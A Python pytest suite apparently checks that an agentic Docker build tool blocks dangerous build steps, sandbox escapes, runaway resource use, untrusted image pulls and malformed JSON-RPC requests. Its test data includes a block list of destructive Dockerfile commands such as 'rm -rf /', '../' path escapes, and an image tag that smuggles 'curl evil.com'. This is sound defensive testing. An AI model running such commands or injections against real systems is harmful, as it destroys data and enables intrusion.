"""Master adversarial suite for Buildx — security, containment, protocol.

Rules for this file:
  * every test is marked `slow` — excluded from fast PR runs
"""
from __future__ import annotations

import pytest

pytestmark = [pytest.mark.slow, pytest.mark.adversarial]


# ══════════════════════════════════════════════════════════════════════════
# A. Build Shield — must block dangerous build steps
# ══════════════════════════════════════════════════════════════════════════

DANGEROUS_COMMANDS = ["RUN sudo", "RUN chmod 777", "RUN rm -rf /", "COPY /etc", "ADD http://malicious"]

@pytest.mark.asyncio
async def test_a1_dangerous_build_step_blocked(buildx):
    """Builds with dangerous commands must be blocked."""
    for cmd in DANGEROUS_COMMANDS:
        dockerfile = f"FROM alpine\n{cmd}"
        with pytest.raises(Exception):
            await buildx.build(dockerfile)


# ══════════════════════════════════════════════════════════════════════════
# B. Build Containment — builds must not escape sandbox
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_b1_absolute_write_outside_build_context_blocked(buildx, tmp_path):
    from buildx_agentic.actions import dispatch
    target = tmp_path.parent / "escaped.txt"
    dockerfile = f"FROM alpine\nRUN echo x > {str(target)}"
    r = await dispatch(buildx, {
        "action": "build.run",
        "params": {"dockerfile": dockerfile},
        "dryRun": False,
    })
    assert r["ok"] is False
    assert not target.exists()


@pytest.mark.asyncio
async def test_b2_relative_escape_via_dotdot_blocked(buildx):
    from buildx_agentic.actions import dispatch
    dockerfile = "FROM alpine\nRUN echo x > ../../escape.txt"
    r = await dispatch(buildx, {
        "action": "build.run",
        "params": {"dockerfile": dockerfile},
        "dryRun": False,
    })
    assert r["ok"] is False


@pytest.mark.asyncio
async def test_b3_network_egress_blocked(buildx):
    """Builds must not be able to make outbound network connections by default."""
    from buildx_agentic.actions import dispatch
    dockerfile = "FROM alpine\nRUN wget http://example.com"
    r = await dispatch(buildx, {
        "action": "build.run",
        "params": {"dockerfile": dockerfile},
        "dryRun": False,
    })
    assert r["ok"] is False


# ══════════════════════════════════════════════════════════════════════════
# C. Resource Limits — must enforce build timeouts and resource caps
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_c1_build_timeout_enforced(buildx):
    """Long-running builds must be killed within timeout."""
    from buildx_agentic.actions import dispatch
    dockerfile = "FROM alpine\nRUN sleep 60"
    r = await dispatch(buildx, {
        "action": "build.run",
        "params": {"dockerfile": dockerfile},
        "dryRun": False,
    })
    assert r["ok"] is False or r.get("timed_out", False)


@pytest.mark.asyncio
async def test_c2_disk_limit_enforced(buildx):
    """Builds must not exceed disk space limit."""
    from buildx_agentic.actions import dispatch
    dockerfile = "FROM alpine\nRUN dd if=/dev/zero of=large.img bs=1M count=1000"
    r = await dispatch(buildx, {
        "action": "build.run",
        "params": {"dockerfile": dockerfile},
        "dryRun": False,
    })
    assert r["ok"] is False or r.get("disk_exceeded", False)


# ══════════════════════════════════════════════════════════════════════════
# D. Registry Security — must enforce image signing and verification
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_d1_unsigned_image_blocked(buildx):
    """Unsigned images from untrusted registries must be blocked."""
    from buildx_agentic.actions import dispatch
    r = await dispatch(buildx, {
        "action": "build.pull",
        "params": {"image": "untrusted.registry/image:latest"},
        "dryRun": False,
    })
    assert r["ok"] is False


@pytest.mark.asyncio
async def test_d2_image_tag_injection_blocked(buildx):
    """Malicious image tags must be blocked."""
    from buildx_agentic.actions import dispatch
    r = await dispatch(buildx, {
        "action": "build.pull",
        "params": {"image": "alpine:latest; curl evil.com"},
        "dryRun": False,
    })
    assert r["ok"] is False


# ══════════════════════════════════════════════════════════════════════════
# E. Protocol Conformance — JSON-RPC 2.0 must be strictly enforced
# ══════════════════════════════════════════════════════════════════════════

@pytest.mark.asyncio
async def test_e1_rpc_invalid_json_rejected(buildx):
    """Non-JRPC requests must be rejected."""
    from buildx_agentic.actions import dispatch
    r = await dispatch(buildx, {"invalid": "request"})
    assert r["ok"] is False


@pytest.mark.asyncio
async def test_e2_rpc_missing_method_rejected(buildx):
    """JRPC requests without method must be rejected."""
    from buildx_agentic.actions import dispatch
    r = await dispatch(buildx, {"jsonrpc": "2.0", "id": 1})
    assert r["ok"] is False


@pytest.mark.asyncio
async def test_e3_rpc_version_validation(buildx):
    """JRPC must require jsonrpc version 2.0."""
    from buildx_agentic.actions import dispatch
    r = await dispatch(buildx, {"jsonrpc": "1.0", "method": "build.run", "params": {}, "id": 1})
    assert r["ok"] is False
